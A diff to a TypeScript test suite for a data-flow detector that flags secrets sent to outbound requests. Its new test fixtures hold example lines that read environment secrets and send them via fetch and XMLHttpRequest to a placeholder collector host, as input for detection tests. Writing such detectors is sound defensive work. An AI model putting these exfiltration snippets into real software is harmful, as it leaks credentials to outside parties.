@@ -74,8 +74,10 @@ describe('sensitive data flow candidates', () => {
       ].join('\n')
     ).filter((finding) => finding.ruleId === 'TLP-DATA-001');
     expect(findings).toHaveLength(2);
-    expect(findings.map((finding) => finding.metadata?.sinkClass))
-      .toEqual(['log', 'log']);
+    expect(findings.map((finding) => finding.metadata?.sinkClass)).toEqual([
+      'log',
+      'log'
+    ]);
     expect(JSON.stringify(findings)).not.toContain('PRIVATE_ACCESS_TOKEN');
   });
 
@@ -92,6 +94,24 @@ describe('sensitive data flow candidates', () => {
       'response',
       'outbound-request'
     ]);
+  });
+
+  it('tracks sensitive values through platform fetch receivers but excludes shadowed and arbitrary methods', () => {
+    const findings = analyzeAstSource(
+      'src/platform-fetch.ts',
+      [
+        'const secret = process.env.SERVICE_SECRET;',
+        "globalThis.fetch('https://collector.invalid', { body: secret });",
+        "window['fetch']('https://collector.invalid', { headers: { authorization: secret } });",
+        "api.fetch('https://collector.invalid', { body: secret });",
+        'function local(globalThis: { fetch(url: string, options: unknown): void }) {',
+        "  globalThis.fetch('https://collector.invalid', { body: secret });",
+        '}'
+      ].join('\n')
+    ).filter((finding) => finding.ruleId === 'TLP-DATA-001');
+
+    expect(findings.map((finding) => finding.location?.line)).toEqual([2, 3]);
+    expect(JSON.stringify(findings)).not.toContain('SERVICE_SECRET');
   });
 
   it('detects credential values written to response headers and cookies', () => {
@@ -434,6 +454,34 @@ export async function handler() {
       findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
     ).toBe(true);
     expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
+  it('tracks sensitive XMLHttpRequest headers and bodies without trusting shadowed constructors', () => {
+    const findings = analyzeAstSource(
+      'src/xhr.ts',
+      [
+        'const token = process.env.API_TOKEN;',
+        'const xhr = new XMLHttpRequest();',
+        "xhr.open('POST', 'https://collector.invalid');",
+        "xhr.setRequestHeader('authorization', token);",
+        'xhr.send(JSON.stringify({ token }));',
+        'new XMLHttpRequest().send(token);',
+        'function local(XMLHttpRequest: new () => { send(value: unknown): void }) {',
+        '  new XMLHttpRequest().send(token);',
+        '}'
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+
+    expect(findings.map((finding) => finding.location?.line)).toEqual([
+      4, 5, 6
+    ]);
+    expect(
+      findings.every(
+        (finding) => finding.metadata?.sinkClass === 'outbound-request'
+      )
+    ).toBe(true);
+    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+    expect(JSON.stringify(findings)).not.toContain('authorization');
   });
 
   it('does not treat a shadowed FormData constructor as the browser API', () => {
